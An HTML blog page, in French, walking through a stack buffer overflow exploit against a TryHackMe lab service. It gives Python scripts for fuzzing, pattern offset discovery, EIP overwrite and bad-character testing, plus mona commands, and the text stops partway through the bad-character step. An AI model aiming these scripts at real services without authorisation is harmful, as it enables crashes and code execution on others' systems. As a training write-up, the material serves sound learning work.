@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="fr">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.80.0" />
+
+    
+    
+    
+
+<title>Buffer Overflow • LOLOLEKIK</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Buffer Overflow"/>
+<meta name="twitter:description" content="Introduction Voici un petit guide pour exploiter des buffers overflow simple avec shellcode.
+Dans notre cas on utilise une room de TryHackMe pour s&rsquo;entrainer et on a accès à la machine distante avec immunity.
+Fuzzing La première étape consite à fuzz le programme pour provoquer un segmentation fault.
+Pour cela j&rsquo;utilise le script ci-dessous
+#!/usr/bin/env python3 import socket, time, sys ip = &#34;10.10.9.235&#34; port = 1337 timeout = 5 prefix = &#34;OVERFLOW4 &#34; # si besoin string = prefix &#43; &#34;A&#34; * 100 while True: try: with socket."/>
+
+<meta property="og:title" content="Buffer Overflow" />
+<meta property="og:description" content="Introduction Voici un petit guide pour exploiter des buffers overflow simple avec shellcode.
+Dans notre cas on utilise une room de TryHackMe pour s&rsquo;entrainer et on a accès à la machine distante avec immunity.
+Fuzzing La première étape consite à fuzz le programme pour provoquer un segmentation fault.
+Pour cela j&rsquo;utilise le script ci-dessous
+#!/usr/bin/env python3 import socket, time, sys ip = &#34;10.10.9.235&#34; port = 1337 timeout = 5 prefix = &#34;OVERFLOW4 &#34; # si besoin string = prefix &#43; &#34;A&#34; * 100 while True: try: with socket." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://lololekik.com/cuisine/bo/" />
+<meta property="og:site_name" content="OffSec &amp; CO" />
+
+
+    
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/qtcreator_dark.min.css">
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/scss/hyde-hyde.816e5b26c5966343ef21f902ba05a763964deb2ae3fdcd9a954614131b756c59.css" integrity="sha256-gW5bJsWWY0PvIfkCugWnY5ZN6yrj/c2alUYUExt1bFk=">
+
+
+<link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">
+
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/custom.css">
+
+
+
+
+
+</head>
+
+
+    <body class=" ">
+    
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      <span class="site__title">
+        <a href="http://lololekik.com/">LOLOLEKIK</a>
+      </span>
+      
+        
+        
+        
+        <div class="author-image">
+          <img src="http://lololekik.com/img/author.jpg" alt="Author Image" class="img--circle img--headshot element--center">
+        </div>
+        
+      
+      
+      <p class="site__description">
+         OffSec &amp; Co 
+      </p>
+    </div>
+    <div class="collapsible-menu">
+      <input type="checkbox" id="menuToggle">
+      <label for="menuToggle">LOLOLEKIK</label>
+      <div class="menu-content">
+        <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/cuisine/">
+						<span>Cuisine</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/exploit/">
+						<span>Exploit</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/network/">
+						<span>Network</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/writeups/">
+						<span>WriteUps</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/hack-the-box/">
+						<span>HackTheBox</span>
+					</a>
+				</li>
+			 
+		
+	</ul>
+</div>
+
+        <section class="social">
+	
+	
+	
+	<a href="https://github.com/LOLOLEKIK" rel="me"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	<a href="https://root-me.org/lololekik" target="blank" class="linklogo"><div class="rootme_logo logohover"> </div></a>
+	
+	
+	<a href="https://hackthebox.eu/home/users/profile/202145" target="blank" class="linklogo"><div class="hackthebox_logo logohover"> </div></a>
+	
+	
+	<a href="https://linkedin.com/in/loris-thiebaut-8b4b85197" rel="me"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	<a href="mailto:loris.thiebaut@gmail.com" rel="me"><i class="fas fa-at fa-lg" aria-hidden="true"></i></a>
+	
+</section>
+
+      </div>
+    </div>
+    
+
+<div class="builtwith">
+Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+</div>
+
+
+  </div>
+</div>
+
+        <div class="content container">
+            
+    
+<article>
+  <header>
+    <h1>Buffer Overflow</h1>
+    
+    
+<div class="post__meta">
+    
+    
+    
+    
+      
+      
+          in
+          
+          
+              <a class="badge badge-category" href="/categories/cuisine">CUISINE</a>
+              
+          
+      
+    
+    
+    
+      
+      
+          <br/>
+           <i class="fas fa-tags"></i>
+          
+          <a class="badge badge-tag" href="/tags/buffer">buffer</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/exploit">exploit</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/immunity">immunity</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/mona">mona</a>
+          
+      
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 6 min read
+</div>
+
+
+  </header>
+  
+  
+  <div class="post">
+    <h1 id="introduction">Introduction</h1>
+<p>Voici un petit guide pour exploiter des buffers overflow simple avec shellcode.</p>
+<p>Dans notre cas on utilise une room de TryHackMe pour s&rsquo;entrainer et on a accès à la machine distante avec immunity.</p>
+<h1 id="fuzzing">Fuzzing</h1>
+<p>La première étape consite à fuzz le programme pour provoquer un segmentation fault.</p>
+<p>Pour cela j&rsquo;utilise le script ci-dessous</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span> time<span style="color:#f92672">,</span> sys
+
+ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.10.9.235&#34;</span>
+
+port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
+timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>
+prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;OVERFLOW4 &#34;</span> <span style="color:#75715e"># si besoin</span>
+
+string <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">100</span>
+
+<span style="color:#66d9ef">while</span> True:
+  <span style="color:#66d9ef">try</span>:
+    <span style="color:#66d9ef">with</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM) <span style="color:#66d9ef">as</span> s:
+      s<span style="color:#f92672">.</span>settimeout(timeout)
+      s<span style="color:#f92672">.</span>connect((ip, port))
+      s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+      <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Fuzzing with {} bytes&#34;</span><span style="color:#f92672">.</span>format(len(string) <span style="color:#f92672">-</span> len(prefix)))
+      s<span style="color:#f92672">.</span>send(bytes(string, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
+      s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+  <span style="color:#66d9ef">except</span>:
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Fuzzing crashed at {} bytes&#34;</span><span style="color:#f92672">.</span>format(len(string) <span style="color:#f92672">-</span> len(prefix)))
+    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
+  string <span style="color:#f92672">+=</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">*</span> <span style="color:#e6db74">&#34;A&#34;</span>
+  time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</code></pre></div><p>Dans notre exemple on voit qu&rsquo;à partir de 2100 caractères le programme ne répond plus.</p>
+
+
+
+  <img src="/img/bo/fuzz.png" alt="fuzz buffer overflow" class="imageformat"/>
+
+<h1 id="contrôler-notre-eip">Contrôler notre EIP</h1>
+<p>Pour contrôler notre EIP il va falloir déterminer à partir de quel moment exactement notre programme cesse de fonctionner.</p>
+<p>Pour cela on va utiliser un script génère va générer des patterns uniques afin qu&rsquo;on puisse identifier la taille nécessaire pour provoquer un buffer overflow.</p>
+<p>Ici on a besoin donc de 2100 caractères.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <span style="color:#ae81ff">2100</span>
+</code></pre></div>
+
+
+  <img src="/img/bo/pattern.png" alt="generate pattern" class="imageformat"/>
+
+<p>On envoie ensuite notre payload via ce script</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#f92672">import</span> socket
+
+ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.10.9.235&#34;</span>
+port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
+bad <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9&#34;</span>
+prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;OVERFLOW4 &#34;</span>
+offset <span style="color:#f92672">=</span>  <span style="color:#ae81ff">0</span>
+overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
+retn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+
+buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> bad <span style="color:#f92672">+</span> postfix
+
+s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+
+<span style="color:#66d9ef">try</span>:
+  s<span style="color:#f92672">.</span>connect((ip, port))
+  <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
+  s<span style="color:#f92672">.</span>send(bytes(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
+  <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Done!&#34;</span>)
+<span style="color:#66d9ef">except</span>:
+  <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Could not connect.&#34;</span>)
+
+</code></pre></div><p>Une fois le script executé, il faut ensuite aller du côté de immunity.</p>
+<p>On commence par configurer notre environnement avec mona via cette commande :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps" data-lang="ps"><span style="color:#a6e22e">!mona</span> <span style="color:#a6e22e">config</span> <span style="color:#a6e22e">-set</span> <span style="color:#a6e22e">workingfolder</span> <span style="color:#a6e22e">c:\mona\</span><span style="color:#75715e">%p
+</span></code></pre></div><p>On rechere ensuite l&rsquo;endroit du crash avec cette commade :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps" data-lang="ps"><span style="color:#a6e22e">!mona</span> <span style="color:#a6e22e">findmsp</span> <span style="color:#a6e22e">-distance</span> <span style="color:#ae81ff">2100</span>
+</code></pre></div><p>Il faut remplacer le 2100 par la longueur du pattern créé. On trouve alors une ligne qui nous indique l&rsquo;emplacement du patterne et la taille de notre buffer.</p>
+
+
+
+  <img src="/img/bo/mona_search.png" alt="mona search pattern" class="imageformat"/>
+
+<p>On peut maintenant ajouter la taille du buffer dans notre code et tenter d&rsquo;écrire sur l&rsquo;EIP en utilisant la variable rtn.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#f92672">import</span> socket
+
+ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.10.9.235&#34;</span>
+port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
+bad <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;OVERFLOW4 &#34;</span>
+offset <span style="color:#f92672">=</span>  <span style="color:#ae81ff">2026</span>
+overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
+retn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;BBBB&#34;</span>
+padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+
+buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> bad <span style="color:#f92672">+</span> postfix
+
+s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+
+<span style="color:#66d9ef">try</span>:
+  s<span style="color:#f92672">.</span>connect((ip, port))
+  <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
+  s<span style="color:#f92672">.</span>send(bytes(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
+  <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Done!&#34;</span>)
+<span style="color:#66d9ef">except</span>:
+  <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Could not connect.&#34;</span>)
+</code></pre></div><p>Ici on voit bien que notre EIP a pris la valeur de B (42) au lieu de A (41)</p>
+
+
+
+  <img src="/img/bo/eip_control.png" alt="control eip" class="imageformat"/>
+
+<h1 id="les-bad-characters">Les bad characters</h1>
+<p>La prochaine étape devrait être celle de chercher une instruction nous permettant d&rsquo;executer notre shellcode cependant pour pouvoir crafter ce dernier et utiliser l&rsquo;adresse d&rsquo;une instruction valide, il faut déterminer quels sont les caractères utilisables.</p>
+<p>Pour faire ça on commence à créer un payload qui permettra d&rsquo;identifier tous les caractères.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">blacklist <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x00&#34;</span><span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span>)
+<span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">256</span>):
+  <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;{:02x}&#34;</span><span style="color:#f92672">.</span>format(x) <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> blacklist:
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;{:02x}&#34;</span><span style="color:#f92672">.</span>format(x), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+<span style="color:#66d9ef">print</span>()
+</code></pre></div><p>Une fois ceci fait on les ajoute à notre buffer.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#f92672">import</span> socket
+
+ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.10.9.235&#34;</span>
+port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
+bad <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span style="color:#e6db74">&#34;</span>
+prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;OVERFLOW4 &#34;</span>
+offset <span style="color:#f92672">=</span>  <span style="color:#ae81ff">2026</span>
+overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
+retn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;BBBB&#34;</span>
+padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+
+buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> bad <span style="color:#f92672">+</span> postfix
+
+s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+
+<span style="color:#66d9ef">try</span>:
+  s<span style="color:#f92672">.</span>connect((ip, port))
+  <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
+  s<span style="color:#f92672">.</span>send(bytes(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
+  <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Done!&#34;</span>)
+<span style="color:#66d9ef">except</span>:
+  <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Could not connect.&#34;</span>)
+
+</code></pre></div><p>Sur immunity on va aussi créer un fichier qui nous permettra de comparer les caractères manquants ou modifiés (donc inutilisable (ou pas)). Bien sûr on utilisera mona.</p>
+<p>Pour cela on utilise la commande suivante et la aussi on blackliste d&rsquo;entré \x00 :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps" data-lang="ps"><span style="color:#a6e22e">!mona</span> <span style="color:#a6e22e">bytearray</span> <span style="color:#a6e22e">-b</span> <span style="color:#a6e22e">&#34;\x00&#34;</span>
+</code></pre></div>
+
+
+  <img src="/img/bo/generate_bytes.png" alt="mona generate bytes" class="imageformat"/>
+
+<p>Une fois ceci fait on peut lancer notre exploit. Il faut alors noter la valeur de l&rsquo;esp.</p>
+
+
+
+  <img src="/img/bo/esp.png" alt="get esp value" class="imageformat"/>
+
+<p>Avec cetter derière on va pouvoir lancer une comparaison sur les caractères envoyés et attendus.</p>
+<p>On utilise cette commande de mona :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps" data-lang="ps"><span style="color:#a6e22e">!mona</span> <span style="color:#a6e22e">compare</span> <span style="color:#a6e22e">-f</span> <span style="color:#a6e22e">C:\mona\oscp\bytearray.bin</span> <span style="color:#a6e22e">-a</span> <span style="color:#a6e22e">0186FA30</span>
+</code></pre></div>
+
+
+  <img src="/img/bo/compare.png" alt="mona compare bytes" class="imageformat"/>
+
+<p>Nous sommes dans un processuss itératif ou à chaque fois on va recréer la liste de caractère pour jusqu&rsquo;à ce que mona nous indique que nous n&rsquo;avons plus de caractère mauvais.</p>
+<p>On commence donc par enlever le premier caractère de chaque duo car il est fort probable que le deuxième ai été marqué mauvais à cause du premier. Comme on est dans un processus itératif, au pire on l&rsquo;enlevera plus tard.</p>
+<p>On commence par recréer un python la liste</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">listRem <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x00</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xa9</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xcd</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xd4&#34;</span><span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span>)
+<span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">256</span>):
